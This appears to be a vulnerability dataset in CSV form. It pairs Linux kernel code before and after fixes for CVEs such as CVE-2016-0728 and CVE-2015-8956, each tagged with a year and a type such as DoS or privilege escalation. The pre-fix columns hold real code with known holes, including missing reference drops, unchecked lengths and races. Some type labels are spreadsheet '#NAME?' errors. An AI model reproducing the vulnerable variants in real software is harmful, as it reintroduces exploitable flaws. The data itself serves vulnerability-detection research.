 if (unlikely(len == ASN1_INDEFINITE_LENGTH)) {
 /* Indefinite length */
	}

	n = len - 0x80;
 if (unlikely(n > sizeof(len) - 1))
 goto length_too_long;
 if (unlikely(n > datalen - dp))
 goto data_overrun_error;
	len = 0;
 for (; n > 0; n--) {
		len <<= 8;
		len |= data[dp++];
	}
check_length:
 if (len > datalen - dp)
 goto data_overrun_error;
	dp += len;
 goto next_tag;

"
2016,DoS Overflow +Priv ,CVE-2016-0728,"		ret = PTR_ERR(keyring);
 goto error2;
	} else if (keyring == new->session_keyring) {

		ret = 0;
 goto error2;
	}
","		ret = PTR_ERR(keyring);
 goto error2;
	} else if (keyring == new->session_keyring) {
 key_put(keyring);
		ret = 0;
 goto error2;
	}
"
2016,DoS +Info ,CVE-2016-0723," return ret;
}























/**
 *	send_break	-	performed time break
 *	@tty: device to break on
 case TIOCGSID:
 return tiocgsid(tty, real_tty, p);
 case TIOCGETD:
 return put_user(tty->ldisc->ops->num, (int __user *)p);
 case TIOCSETD:
 return tiocsetd(tty, p);
 case TIOCVHANGUP:
"," return ret;
}

/**
 *	tiocgetd	-	get line discipline
 *	@tty: tty device
 *	@p: pointer to user data
 *
 *	Retrieves the line discipline id directly from the ldisc.
 *
 *	Locking: waits for ldisc reference (in case the line discipline
 *		is changing or the tty is being hungup)
 */

static int tiocgetd(struct tty_struct *tty, int __user *p)
{
 struct tty_ldisc *ld;
 int ret;

	ld = tty_ldisc_ref_wait(tty);
	ret = put_user(ld->ops->num, p);
 tty_ldisc_deref(ld);
 return ret;
}

/**
 *	send_break	-	performed time break
 *	@tty: device to break on
 case TIOCGSID:
 return tiocgsid(tty, real_tty, p);
 case TIOCGETD:
 return tiocgetd(tty, p);
 case TIOCSETD:
 return tiocsetd(tty, p);
 case TIOCVHANGUP:
"
2019,Overflow ,CVE-2015-9289," struct cx24116_state *state = fe->demodulator_priv;
 int i, ret;





 /* Dump DiSEqC message */
 if (debug) {
 printk(KERN_INFO ""cx24116: %s("", __func__);
 printk("") toneburst=%d\n"", toneburst);
	}

 /* Validate length */
 if (d->msg_len > (CX24116_ARGLEN - CX24116_DISEQC_MSGOFS))
 return -EINVAL;

 /* DiSEqC message */
 for (i = 0; i < d->msg_len; i++)
		state->dsec_cmd.args[CX24116_DISEQC_MSGOFS + i] = d->msg[i];
"," struct cx24116_state *state = fe->demodulator_priv;
 int i, ret;

 /* Validate length */
 if (d->msg_len > sizeof(d->msg))
 return -EINVAL;

 /* Dump DiSEqC message */
 if (debug) {
 printk(KERN_INFO ""cx24116: %s("", __func__);
 printk("") toneburst=%d\n"", toneburst);
	}





 /* DiSEqC message */
 for (i = 0; i < d->msg_len; i++)
		state->dsec_cmd.args[CX24116_DISEQC_MSGOFS + i] = d->msg[i];
"
2017,#NAME?,CVE-2015-9004,"#endif /* CONFIG_PERF_EVENTS */
};

enum perf_event_context_type {
	task_context,
	cpu_context,
};

/**
 * struct perf_event_context - event context structure
 *
 * Used as a container for task events and CPU events as well:
 */
struct perf_event_context {
 struct pmu			*pmu;
 enum perf_event_context_type	type;
 /*
	 * Protect the states of the events in the list,
	 * nr_active, and the list:
 __perf_event_init_context(&cpuctx->ctx);
 lockdep_set_class(&cpuctx->ctx.mutex, &cpuctx_mutex);
 lockdep_set_class(&cpuctx->ctx.lock, &cpuctx_lock);
		cpuctx->ctx.type = cpu_context;
		cpuctx->ctx.pmu = pmu;

 __perf_cpu_hrtimer_init(cpuctx, cpu);
		 * task or CPU context:
 */
 if (move_group) {
 if (group_leader->ctx->type != ctx->type)












 goto err_context;
		} else {
 if (group_leader->ctx != ctx)
","#endif /* CONFIG_PERF_EVENTS */
};






/**
 * struct perf_event_context - event context structure
 *
 * Used as a container for task events and CPU events as well:
 */
struct perf_event_context {
 struct pmu			*pmu;

 /*
	 * Protect the states of the events in the list,
	 * nr_active, and the list:
 __perf_event_init_context(&cpuctx->ctx);
 lockdep_set_class(&cpuctx->ctx.mutex, &cpuctx_mutex);
 lockdep_set_class(&cpuctx->ctx.lock, &cpuctx_lock);

		cpuctx->ctx.pmu = pmu;

 __perf_cpu_hrtimer_init(cpuctx, cpu);
		 * task or CPU context:
 */
 if (move_group) {
 /*
			 * Make sure we're both on the same task, or both
			 * per-cpu events.
 */
 if (group_leader->ctx->task != ctx->task)
 goto err_context;

 /*
			 * Make sure we're both events for the same CPU;
			 * grouping events for different CPUs is broken; since
			 * you can never concurrently schedule them anyhow.
 */
 if (group_leader->cpu != event->cpu)
 goto err_context;
		} else {
 if (group_leader->ctx != ctx)
"
2016,DoS ,CVE-2015-8970," struct scatterlist sg[0];
};






struct skcipher_ctx {
 struct list_head tsgl;
 struct af_alg_sgl rsgl;

static void *skcipher_bind(const char *name, u32 type, u32 mask)
{
 return crypto_alloc_skcipher(name, type, mask);















}

static void skcipher_release(void *private)
{
 crypto_free_skcipher(private);



}

static int skcipher_setkey(void *private, const u8 *key, unsigned int keylen)
{
 return crypto_skcipher_setkey(private, key, keylen);






}

static void skcipher_wait(struct sock *sk)
{
 struct skcipher_ctx *ctx;
 struct alg_sock *ask = alg_sk(sk);
 unsigned int len = sizeof(*ctx) + crypto_skcipher_reqsize(private);






	ctx = sock_kmalloc(sk, len, GFP_KERNEL);
 if (!ctx)
 return -ENOMEM;

	ctx->iv = sock_kmalloc(sk, crypto_skcipher_ivsize(private),
			       GFP_KERNEL);
 if (!ctx->iv) {
 sock_kfree_s(sk, ctx, len);
 return -ENOMEM;
	}

 memset(ctx->iv, 0, crypto_skcipher_ivsize(private));

 INIT_LIST_HEAD(&ctx->tsgl);
	ctx->len = len;

	ask->private = ctx;

 skcipher_request_set_tfm(&ctx->req, private);
 skcipher_request_set_callback(&ctx->req, CRYPTO_TFM_REQ_MAY_BACKLOG,
				      af_alg_complete, &ctx->completion);

"," struct scatterlist sg[0];
};

struct skcipher_tfm {
 struct crypto_skcipher *skcipher;
 bool has_key;
};

struct skcipher_ctx {
 struct list_head tsgl;
 struct af_alg_sgl rsgl;

static void *skcipher_bind(const char *name, u32 type, u32 mask)
{
 struct skcipher_tfm *tfm;
 struct crypto_skcipher *skcipher;

	tfm = kzalloc(sizeof(*tfm), GFP_KERNEL);
 if (!tfm)
 return ERR_PTR(-ENOMEM);

	skcipher = crypto_alloc_skcipher(name, type, mask);
 if (IS_ERR(skcipher)) {
 kfree(tfm);
 return ERR_CAST(skcipher);
	}

	tfm->skcipher = skcipher;

 return tfm;
}

static void skcipher_release(void *private)
{
 struct skcipher_tfm *tfm = private;

 crypto_free_skcipher(tfm->skcipher);
 kfree(tfm);
}

static int skcipher_setkey(void *private, const u8 *key, unsigned int keylen)
{
 struct skcipher_tfm *tfm = private;
 int err;

	err = crypto_skcipher_setkey(tfm->skcipher, key, keylen);
	tfm->has_key = !err;

 return err;
}

static void skcipher_wait(struct sock *sk)
{
 struct skcipher_ctx *ctx;
 struct alg_sock *ask = alg_sk(sk);
 struct skcipher_tfm *tfm = private;
 struct crypto_skcipher *skcipher = tfm->skcipher;
 unsigned int len = sizeof(*ctx) + crypto_skcipher_reqsize(skcipher);

 if (!tfm->has_key)
 return -ENOKEY;

	ctx = sock_kmalloc(sk, len, GFP_KERNEL);
 if (!ctx)
 return -ENOMEM;

	ctx->iv = sock_kmalloc(sk, crypto_skcipher_ivsize(skcipher),
			       GFP_KERNEL);
 if (!ctx->iv) {
 sock_kfree_s(sk, ctx, len);
 return -ENOMEM;
	}

 memset(ctx->iv, 0, crypto_skcipher_ivsize(skcipher));

 INIT_LIST_HEAD(&ctx->tsgl);
	ctx->len = len;

	ask->private = ctx;

 skcipher_request_set_tfm(&ctx->req, skcipher);
 skcipher_request_set_callback(&ctx->req, CRYPTO_TFM_REQ_MAY_BACKLOG,
				      af_alg_complete, &ctx->completion);

"
2016,#NAME?,CVE-2015-8967," * The sys_call_table array must be 4K aligned to be accessible from
 * kernel/entry.S.
 */
void *sys_call_table[__NR_syscalls] __aligned(4096) = {
	[0 ... __NR_syscalls - 1] = sys_ni_syscall,
#include <asm/unistd.h>
};
"," * The sys_call_table array must be 4K aligned to be accessible from
 * kernel/entry.S.
 */
void * const sys_call_table[__NR_syscalls] __aligned(4096) = {
	[0 ... __NR_syscalls - 1] = sys_ni_syscall,
#include <asm/unistd.h>
};
"
2016,#NAME?,CVE-2015-8966," pid_t	l_pid;
} __attribute__ ((packed,aligned(4)));

asmlinkage long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd,
 unsigned long arg)
{
 struct oabi_flock64 user;
 struct flock64 kernel;
 mm_segment_t fs = USER_DS; /* initialized to kill a warning */
 unsigned long local_arg = arg;
 int ret;































 switch (cmd) {
 case F_OFD_GETLK:
 case F_OFD_SETLK:
 case F_OFD_SETLKW:
 case F_GETLK64:
 case F_SETLK64:
 case F_SETLKW64:
 if (copy_from_user(&user, (struct oabi_flock64 __user *)arg,
 sizeof(user)))
 return -EFAULT;
		kernel.l_type	= user.l_type;
		kernel.l_whence	= user.l_whence;
		kernel.l_start	= user.l_start;
		kernel.l_len	= user.l_len;
		kernel.l_pid	= user.l_pid;
		local_arg = (unsigned long)&kernel;
		fs = get_fs();
 set_fs(KERNEL_DS);
	}

	ret = sys_fcntl64(fd, cmd, local_arg);

 switch (cmd) {
 case F_GETLK64:
 if (!ret) {
			user.l_type	= kernel.l_type;
			user.l_whence	= kernel.l_whence;
			user.l_start	= kernel.l_start;
			user.l_len	= kernel.l_len;
			user.l_pid	= kernel.l_pid;
 if (copy_to_user((struct oabi_flock64 __user *)arg,
					 &user, sizeof(user)))
				ret = -EFAULT;
		}
 case F_SETLK64:
 case F_SETLKW64:
 set_fs(fs);
	}

 return ret;
}

struct oabi_epoll_event {
"," pid_t	l_pid;
} __attribute__ ((packed,aligned(4)));

static long do_locks(unsigned int fd, unsigned int cmd,
 unsigned long arg)
{

 struct flock64 kernel;
 struct oabi_flock64 user;
 mm_segment_t fs;
 long ret;

 if (copy_from_user(&user, (struct oabi_flock64 __user *)arg,
 sizeof(user)))
 return -EFAULT;
	kernel.l_type	= user.l_type;
	kernel.l_whence	= user.l_whence;
	kernel.l_start	= user.l_start;
	kernel.l_len	= user.l_len;
	kernel.l_pid	= user.l_pid;

	fs = get_fs();
 set_fs(KERNEL_DS);
	ret = sys_fcntl64(fd, cmd, (unsigned long)&kernel);
 set_fs(fs);

 if (!ret && (cmd == F_GETLK64 || cmd == F_OFD_GETLK)) {
		user.l_type	= kernel.l_type;
		user.l_whence	= kernel.l_whence;
		user.l_start	= kernel.l_start;
		user.l_len	= kernel.l_len;
		user.l_pid	= kernel.l_pid;
 if (copy_to_user((struct oabi_flock64 __user *)arg,
				 &user, sizeof(user)))
			ret = -EFAULT;
	}
 return ret;
}

asmlinkage long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd,
 unsigned long arg)
{
 switch (cmd) {
 case F_OFD_GETLK:
 case F_OFD_SETLK:
 case F_OFD_SETLKW:
 case F_GETLK64:
 case F_SETLK64:
 case F_SETLKW64:
 return do_locks(fd, cmd, arg);














 default:
 return sys_fcntl64(fd, cmd, arg);













	}


}

struct oabi_epoll_event {
"
2016,#NAME?,CVE-2015-8964," *	they are not on hot paths so a little discipline won't do
 *	any harm.
 *




 *	Locking: takes termios_rwsem
 */

 down_write(&tty->termios_rwsem);
	tty->termios.c_line = num;
 up_write(&tty->termios_rwsem);



}

/**
"," *	they are not on hot paths so a little discipline won't do
 *	any harm.
 *
 *	The line discipline-related tty_struct fields are reset to
 *	prevent the ldisc driver from re-using stale information for
 *	the new ldisc instance.
 *
 *	Locking: takes termios_rwsem
 */

 down_write(&tty->termios_rwsem);
	tty->termios.c_line = num;
 up_write(&tty->termios_rwsem);

	tty->disc_data = NULL;
	tty->receive_room = 0;
}

/**
"
2016,DoS +Priv ,CVE-2015-8963,"
 /* Recursion avoidance in each contexts */
 int				recursion[PERF_NR_CONTEXTS];

 /* Keeps track of cpu being initialized/exited */
 bool				online;
};

static DEFINE_PER_CPU(struct swevent_htable, swevent_htable);
	hwc->state = !(flags & PERF_EF_START);

	head = find_swevent_head(swhash, event);
 if (!head) {
 /*
		 * We can race with cpu hotplug code. Do not
		 * WARN if the cpu just got unplugged.
 */
 WARN_ON_ONCE(swhash->online);
 return -EINVAL;
	}

 hlist_add_head_rcu(&event->hlist_entry, head);
 perf_event_update_userpage(event);
 int err = 0;

 mutex_lock(&swhash->hlist_mutex);

 if (!swevent_hlist_deref(swhash) && cpu_online(cpu)) {
 struct swevent_hlist *hlist;

 struct swevent_htable *swhash = &per_cpu(swevent_htable, cpu);

 mutex_lock(&swhash->hlist_mutex);
	swhash->online = true;
 if (swhash->hlist_refcount > 0) {
 struct swevent_hlist *hlist;


static void perf_event_exit_cpu(int cpu)
{
 struct swevent_htable *swhash = &per_cpu(swevent_htable, cpu);

 perf_event_exit_cpu_context(cpu);

 mutex_lock(&swhash->hlist_mutex);
	swhash->online = false;
 swevent_hlist_release(swhash);
 mutex_unlock(&swhash->hlist_mutex);
}
#else
static inline void perf_event_exit_cpu(int cpu) { }
","
 /* Recursion avoidance in each contexts */
 int				recursion[PERF_NR_CONTEXTS];



};

static DEFINE_PER_CPU(struct swevent_htable, swevent_htable);
	hwc->state = !(flags & PERF_EF_START);

	head = find_swevent_head(swhash, event);
 if (WARN_ON_ONCE(!head))





 return -EINVAL;


 hlist_add_head_rcu(&event->hlist_entry, head);
 perf_event_update_userpage(event);
 int err = 0;

 mutex_lock(&swhash->hlist_mutex);

 if (!swevent_hlist_deref(swhash) && cpu_online(cpu)) {
 struct swevent_hlist *hlist;

 struct swevent_htable *swhash = &per_cpu(swevent_htable, cpu);

 mutex_lock(&swhash->hlist_mutex);

 if (swhash->hlist_refcount > 0) {
 struct swevent_hlist *hlist;


static void perf_event_exit_cpu(int cpu)
{


 perf_event_exit_cpu_context(cpu);





}
#else
static inline void perf_event_exit_cpu(int cpu) { }
"
2016,DoS +Priv Mem. Corr. ,CVE-2015-8962," return k;	/* probably out of space --> ENOMEM */
	}
 if (atomic_read(&sdp->detaching)) {
 if (srp->bio)



 blk_end_request_all(srp->rq, -EIO);



 sg_finish_rem_req(srp);
 return -ENODEV;
	}
"," return k;	/* probably out of space --> ENOMEM */
	}
 if (atomic_read(&sdp->detaching)) {
 if (srp->bio) {
 if (srp->rq->cmd != srp->rq->__cmd)
 kfree(srp->rq->cmd);

 blk_end_request_all(srp->rq, -EIO);
			srp->rq = NULL;
		}

 sg_finish_rem_req(srp);
 return -ENODEV;
	}
"
2016,DoS +Priv ,CVE-2015-8961," return 0;
	}


 if (!handle->h_transaction) {
 err = jbd2_journal_stop(handle);
 return handle->h_err ? handle->h_err : err;
	}

	sb = handle->h_transaction->t_journal->j_private;
	err = handle->h_err;
	rc = jbd2_journal_stop(handle);

 if (!err)
"," return 0;
	}

	err = handle->h_err;
 if (!handle->h_transaction) {
 rc = jbd2_journal_stop(handle);
 return err ? err : rc;
	}

	sb = handle->h_transaction->t_journal->j_private;

	rc = jbd2_journal_stop(handle);

 if (!err)
"
2016,DoS +Info ,CVE-2015-8956,"
static int rfcomm_sock_bind(struct socket *sock, struct sockaddr *addr, int addr_len)
{
 struct sockaddr_rc *sa = (struct sockaddr_rc *) addr;
 struct sock *sk = sock->sk;
 int chan = sa->rc_channel;
 int err = 0;

 BT_DBG(""sk %p %pMR"", sk, &sa->rc_bdaddr);

 if (!addr || addr->sa_family != AF_BLUETOOTH)
 return -EINVAL;







 lock_sock(sk);

 if (sk->sk_state != BT_OPEN) {

 write_lock(&rfcomm_sk_list.lock);

 if (chan && __rfcomm_get_listen_sock_by_addr(chan, &sa->rc_bdaddr)) {

		err = -EADDRINUSE;
	} else {
 /* Save source address */
 bacpy(&rfcomm_pi(sk)->src, &sa->rc_bdaddr);
 rfcomm_pi(sk)->channel = chan;
		sk->sk_state = BT_BOUND;
	}

","
static int rfcomm_sock_bind(struct socket *sock, struct sockaddr *addr, int addr_len)
{
 struct sockaddr_rc sa;
 struct sock *sk = sock->sk;
 int len, err = 0;




 if (!addr || addr->sa_family != AF_BLUETOOTH)
 return -EINVAL;

 memset(&sa, 0, sizeof(sa));
	len = min_t(unsigned int, sizeof(sa), addr_len);
 memcpy(&sa, addr, len);

 BT_DBG(""sk %p %pMR"", sk, &sa.rc_bdaddr);

 lock_sock(sk);

 if (sk->sk_state != BT_OPEN) {

 write_lock(&rfcomm_sk_list.lock);

 if (sa.rc_channel &&
 __rfcomm_get_listen_sock_by_addr(sa.rc_channel, &sa.rc_bdaddr)) {
		err = -EADDRINUSE;
	} else {
 /* Save source address */
 bacpy(&rfcomm_pi(sk)->src, &sa.rc_bdaddr);
 rfcomm_pi(sk)->channel = sa.rc_channel;
		sk->sk_state = BT_BOUND;
	}

"
2016,DoS +Priv ,CVE-2015-8955,"}

static int
validate_event(struct pmu_hw_events *hw_events,
  struct perf_event *event)
{
 struct arm_pmu *armpmu = to_arm_pmu(event->pmu);
 struct hw_perf_event fake_event = event->hw;
 struct pmu *leader_pmu = event->group_leader->pmu;

 if (is_software_event(event))
 return 1;









 if (event->pmu != leader_pmu || event->state < PERF_EVENT_STATE_OFF)
 return 1;

 if (event->state == PERF_EVENT_STATE_OFF && !event->attr.enable_on_exec)
 return 1;


 return armpmu->get_event_idx(hw_events, &fake_event) >= 0;
}

 memset(fake_used_mask, 0, sizeof(fake_used_mask));
	fake_pmu.used_mask = fake_used_mask;

 if (!validate_event(&fake_pmu, leader))
 return -EINVAL;

 list_for_each_entry(sibling, &leader->sibling_list, group_entry) {
 if (!validate_event(&fake_pmu, sibling))
 return -EINVAL;
	}

 if (!validate_event(&fake_pmu, event))
 return -EINVAL;

 return 0;
","}

static int
validate_event(struct pmu *pmu, struct pmu_hw_events *hw_events,
  struct perf_event *event)
{
 struct arm_pmu *armpmu;
 struct hw_perf_event fake_event = event->hw;
 struct pmu *leader_pmu = event->group_leader->pmu;

 if (is_software_event(event))
 return 1;

 /*
	 * Reject groups spanning multiple HW PMUs (e.g. CPU + CCI). The
	 * core perf code won't check that the pmu->ctx == leader->ctx
	 * until after pmu->event_init(event).
 */
 if (event->pmu != pmu)
 return 0;

 if (event->pmu != leader_pmu || event->state < PERF_EVENT_STATE_OFF)
 return 1;

 if (event->state == PERF_EVENT_STATE_OFF && !event->attr.enable_on_exec)
 return 1;

	armpmu = to_arm_pmu(event->pmu);
 return armpmu->get_event_idx(hw_events, &fake_event) >= 0;
}

 memset(fake_used_mask, 0, sizeof(fake_used_mask));
	fake_pmu.used_mask = fake_used_mask;

 if (!validate_event(event->pmu, &fake_pmu, leader))
 return -EINVAL;

 list_for_each_entry(sibling, &leader->sibling_list, group_entry) {
 if (!validate_event(event->pmu, &fake_pmu, sibling))
 return -EINVAL;
	}

 if (!validate_event(event->pmu, &fake_pmu, event))
 return -EINVAL;

 return 0;
"
2016,DoS ,CVE-2015-8953,"
out_cleanup:
 ovl_cleanup(wdir, newdentry);
 goto out;
}

/*
","
out_cleanup:
 ovl_cleanup(wdir, newdentry);
 goto out2;
}

/*
"
2016,DoS ,CVE-2015-8952,"#define rsv_start rsv_window._rsv_start
#define rsv_end rsv_window._rsv_end



/*
 * second extended-fs super-block data in memory
 */
	 * of the mount options.
 */
 spinlock_t s_lock;

};

static inline spinlock_t *

 dquot_disable(sb, -1, DQUOT_USAGE_ENABLED | DQUOT_LIMITS_ENABLED);

 ext2_xattr_put_super(sb);



 if (!(sb->s_flags & MS_RDONLY)) {
 struct ext2_super_block *es = sbi->s_es;

 ext2_msg(sb, KERN_ERR, ""error: insufficient memory"");
 goto failed_mount3;
	}








 /*
	 * set up enough so that it can read an inode
 */
			sb->s_id);
 goto failed_mount;
failed_mount3:


 percpu_counter_destroy(&sbi->s_freeblocks_counter);
 percpu_counter_destroy(&sbi->s_freeinodes_counter);
 percpu_counter_destroy(&sbi->s_dirs_counter);

static int __init init_ext2_fs(void)
{
 int err = init_ext2_xattr();
 if (err)
 return err;
	err = init_inodecache();
 if (err)
 goto out1;
        err = register_filesystem(&ext2_fs_type);
 if (err)
 goto out;
 return 0;
out:
 destroy_inodecache();
out1:
 exit_ext2_xattr();
 return err;
}

static void __exit exit_ext2_fs(void)
{
 unregister_filesystem(&ext2_fs_type);
 destroy_inodecache();
 exit_ext2_xattr();
}

MODULE_AUTHOR(""Remy Card and others"");
","#define rsv_start rsv_window._rsv_start
#define rsv_end rsv_window._rsv_end

struct mb2_cache;

/*
 * second extended-fs super-block data in memory
 */
	 * of the mount options.
 */
 spinlock_t s_lock;
 struct mb2_cache *s_mb_cache;
};

static inline spinlock_t *

 dquot_disable(sb, -1, DQUOT_USAGE_ENABLED | DQUOT_LIMITS_ENABLED);

 if (sbi->s_mb_cache) {
 ext2_xattr_destroy_cache(sbi->s_mb_cache);
		sbi->s_mb_cache = NULL;
	}
 if (!(sb->s_flags & MS_RDONLY)) {
 struct ext2_super_block *es = sbi->s_es;

 ext2_msg(sb, KERN_ERR, ""error: insufficient memory"");
 goto failed_mount3;
	}

#ifdef CONFIG_EXT2_FS_XATTR
	sbi->s_mb_cache = ext2_xattr_create_cache();
 if (!sbi->s_mb_cache) {
 ext2_msg(sb, KERN_ERR, ""Failed to create an mb_cache"");
 goto failed_mount3;
	}
#endif
 /*
	 * set up enough so that it can read an inode
 */
			sb->s_id);
 goto failed_mount;
failed_mount3:
 if (sbi->s_mb_cache)
 ext2_xattr_destroy_cache(sbi->s_mb_cache);
 percpu_counter_destroy(&sbi->s_freeblocks_counter);
 percpu_counter_destroy(&sbi->s_freeinodes_counter);
 percpu_counter_destroy(&sbi->s_dirs_counter);

static int __init init_ext2_fs(void)
{
 int err;


	err = init_inodecache();
 if (err)
 return err;
        err = register_filesystem(&ext2_fs_type);
 if (err)
 goto out;
 return 0;
out:
 destroy_inodecache();


 return err;
}

static void __exit exit_ext2_fs(void)
{
 unregister_filesystem(&ext2_fs_type);
 destroy_inodecache();

}

MODULE_AUTHOR(""Remy Card and others"");
"
2016,#NAME?,CVE-2015-8950,"
		*ret_page = phys_to_page(phys);
		ptr = (void *)val;
 if (flags & __GFP_ZERO)
 memset(ptr, 0, size);
	}

 return ptr;

		*dma_handle = phys_to_dma(dev, page_to_phys(page));
		addr = page_address(page);
 if (flags & __GFP_ZERO)
 memset(addr, 0, size);
 return addr;
	} else {
 return swiotlb_alloc_coherent(dev, size, dma_handle, flags);
","
		*ret_page = phys_to_page(phys);
		ptr = (void *)val;
 memset(ptr, 0, size);

	}

 return ptr;

		*dma_handle = phys_to_dma(dev, page_to_phys(page));
		addr = page_address(page);
 memset(addr, 0, size);

 return addr;
	} else {
 return swiotlb_alloc_coherent(dev, size, dma_handle, flags);
"
2016,#NAME?,CVE-2015-8944,,
2016,DoS ,CVE-2015-8845,"		msr_diff &= MSR_FP | MSR_VEC | MSR_VSX | MSR_FE0 | MSR_FE1;
	}



















 tm_reclaim(thr, thr->regs->msr, cause);

 /* Having done the reclaim, we now have the checkpointed
","		msr_diff &= MSR_FP | MSR_VEC | MSR_VSX | MSR_FE0 | MSR_FE1;
	}

 /*
	 * Use the current MSR TM suspended bit to track if we have
	 * checkpointed state outstanding.
	 * On signal delivery, we'd normally reclaim the checkpointed
	 * state to obtain stack pointer (see:get_tm_stackpointer()).
	 * This will then directly return to userspace without going
	 * through __switch_to(). However, if the stack frame is bad,
	 * we need to exit this thread which calls __switch_to() which
	 * will again attempt to reclaim the already saved tm state.
	 * Hence we need to check that we've not already reclaimed
	 * this state.
	 * We do this using the current MSR, rather tracking it in
	 * some specific thread_struct bit, as it has the additional
	 * benifit of checking for a potential TM bad thing exception.
 */
 if (!MSR_TM_SUSPENDED(mfmsr()))
 return;

 tm_reclaim(thr, thr->regs->msr, cause);

 /* Having done the reclaim, we now have the checkpointed
"
2016,DoS ,CVE-2015-8844,"#define MSR_TS_T __MASK(MSR_TS_T_LG)	/*  Transaction Transactional */
#define MSR_TS_MASK	(MSR_TS_T | MSR_TS_S)   /* Transaction State bits */
#define MSR_TM_ACTIVE(x) (((x) & MSR_TS_MASK) != 0) /* Transaction active? */

#define MSR_TM_TRANSACTIONAL(x)	(((x) & MSR_TS_MASK) == MSR_TS_T)
#define MSR_TM_SUSPENDED(x)	(((x) & MSR_TS_MASK) == MSR_TS_S)

 return 1;
#endif /* CONFIG_SPE */










 /* Now, recheckpoint.  This loads up all of the checkpointed (older)
	 * registers, including FP and V[S]Rs.  After recheckpointing, the
	 * transactional versions should be loaded.
	current->thread.tm_texasr |= TEXASR_FS;
 /* This loads the checkpointed FP/VEC state, if used */
 tm_recheckpoint(&current->thread, msr);
 /* Get the top half of the MSR */
 if (__get_user(msr_hi, &tm_sr->mc_gregs[PT_MSR]))
 return 1;
 /* Pull in MSR TM from user context */
	regs->msr = (regs->msr & ~MSR_TS_MASK) | ((msr_hi<<32) & MSR_TS_MASK);

 /* This loads the speculative FP/VEC state, if used */
 if (msr & MSR_FP) {

 /* get MSR separately, transfer the LE bit if doing signal return */
	err |= __get_user(msr, &sc->gp_regs[PT_MSR]);




 /* pull in MSR TM from user context */
	regs->msr = (regs->msr & ~MSR_TS_MASK) | (msr & MSR_TS_MASK);

","#define MSR_TS_T __MASK(MSR_TS_T_LG)	/*  Transaction Transactional */
#define MSR_TS_MASK	(MSR_TS_T | MSR_TS_S)   /* Transaction State bits */
#define MSR_TM_ACTIVE(x) (((x) & MSR_TS_MASK) != 0) /* Transaction active? */
#define MSR_TM_RESV(x) (((x) & MSR_TS_MASK) == MSR_TS_MASK) /* Reserved */
#define MSR_TM_TRANSACTIONAL(x)	(((x) & MSR_TS_MASK) == MSR_TS_T)
#define MSR_TM_SUSPENDED(x)	(((x) & MSR_TS_MASK) == MSR_TS_S)

 return 1;
#endif /* CONFIG_SPE */

 /* Get the top half of the MSR from the user context */
 if (__get_user(msr_hi, &tm_sr->mc_gregs[PT_MSR]))
 return 1;
	msr_hi <<= 32;
 /* If TM bits are set to the reserved value, it's an invalid context */
 if (MSR_TM_RESV(msr_hi))
 return 1;
 /* Pull in the MSR TM bits from the user context */
	regs->msr = (regs->msr & ~MSR_TS_MASK) | (msr_hi & MSR_TS_MASK);
 /* Now, recheckpoint.  This loads up all of the checkpointed (older)
	 * registers, including FP and V[S]Rs.  After recheckpointing, the
	 * transactional versions should be loaded.
	current->thread.tm_texasr |= TEXASR_FS;
 /* This loads the checkpointed FP/VEC state, if used */
 tm_recheckpoint(&current->thread, msr);






 /* This loads the speculative FP/VEC state, if used */
 if (msr & MSR_FP) {

 /* get MSR separately, transfer the LE bit if doing signal return */
	err |= __get_user(msr, &sc->gp_regs[PT_MSR]);
 /* Don't allow reserved mode. */
 if (MSR_TM_RESV(msr))
 return -EINVAL;

 /* pull in MSR TM from user context */
	regs->msr = (regs->msr & ~MSR_TS_MASK) | (msr & MSR_TS_MASK);

"
2016,DoS ,CVE-2015-8839,"	 * by other means, so we have i_data_sem.
 */
 struct rw_semaphore i_data_sem;









 struct inode vfs_inode;
 struct jbd2_inode *jinode;

extern int ext4_zero_partial_blocks(handle_t *handle, struct inode *inode,
 loff_t lstart, loff_t lend);
extern int ext4_page_mkwrite(struct vm_area_struct *vma, struct vm_fault *vmf);

extern qsize_t *ext4_get_reserved_space(struct inode *inode);
extern void ext4_da_update_reserve_space(struct inode *inode,
 int used, int quota_claim);
 int partial_begin, partial_end;
 loff_t start, end;
 ext4_lblk_t lblk;
 struct address_space *mapping = inode->i_mapping;
 unsigned int blkbits = inode->i_blkbits;

 trace_ext4_zero_range(inode, offset, len, mode);
 return ret;
	}

 /*
	 * Write out all dirty pages to avoid race conditions
	 * Then release them.
 */
 if (mapping->nrpages && mapping_tagged(mapping, PAGECACHE_TAG_DIRTY)) {
		ret = filemap_write_and_wait_range(mapping, offset,
						   offset + len - 1);
 if (ret)
 return ret;
	}

 /*
	 * Round up offset. This is not fallocate, we neet to zero out
	 * blocks, so convert interior block aligned part of the range to
		flags |= (EXT4_GET_BLOCKS_CONVERT_UNWRITTEN |
			  EXT4_EX_NOCACHE);

 /* Now release the pages and zero block aligned part of pages*/
 truncate_pagecache_range(inode, start, end - 1);
		inode->i_mtime = inode->i_ctime = ext4_current_time(inode);

 /* Wait all existing dio workers, newcomers will block on i_mutex */
 ext4_inode_block_unlocked_dio(inode);
 inode_dio_wait(inode);










		ret = ext4_alloc_file_blocks(file, lblk, max_blocks, new_size,
					     flags, mode);

 if (ret)
 goto out_dio;
	}
 goto out_mutex;
	}

 truncate_pagecache(inode, ioffset);

 /* Wait for existing dio to complete */
 ext4_inode_block_unlocked_dio(inode);
 inode_dio_wait(inode);








	credits = ext4_writepage_trans_blocks(inode);
	handle = ext4_journal_start(inode, EXT4_HT_TRUNCATE, credits);
 if (IS_ERR(handle)) {
		ret = PTR_ERR(handle);
 goto out_dio;
	}

 down_write(&EXT4_I(inode)->i_data_sem);

out_stop:
 ext4_journal_stop(handle);
out_dio:

 ext4_inode_resume_unlocked_dio(inode);
out_mutex:
 mutex_unlock(&inode->i_mutex);
 goto out_mutex;
	}

 truncate_pagecache(inode, ioffset);

 /* Wait for existing dio to complete */
 ext4_inode_block_unlocked_dio(inode);
 inode_dio_wait(inode);








	credits = ext4_writepage_trans_blocks(inode);
	handle = ext4_journal_start(inode, EXT4_HT_TRUNCATE, credits);
 if (IS_ERR(handle)) {
		ret = PTR_ERR(handle);
 goto out_dio;
	}

 /* Expand file to avoid data loss if there is error while shifting */

out_stop:
 ext4_journal_stop(handle);
out_dio:

 ext4_inode_resume_unlocked_dio(inode);
out_mutex:
 mutex_unlock(&inode->i_mutex);
{
 int result;
 handle_t *handle = NULL;
 struct super_block *sb = file_inode(vma->vm_file)->i_sb;

 bool write = vmf->flags & FAULT_FLAG_WRITE;

 if (write) {
 sb_start_pagefault(sb);
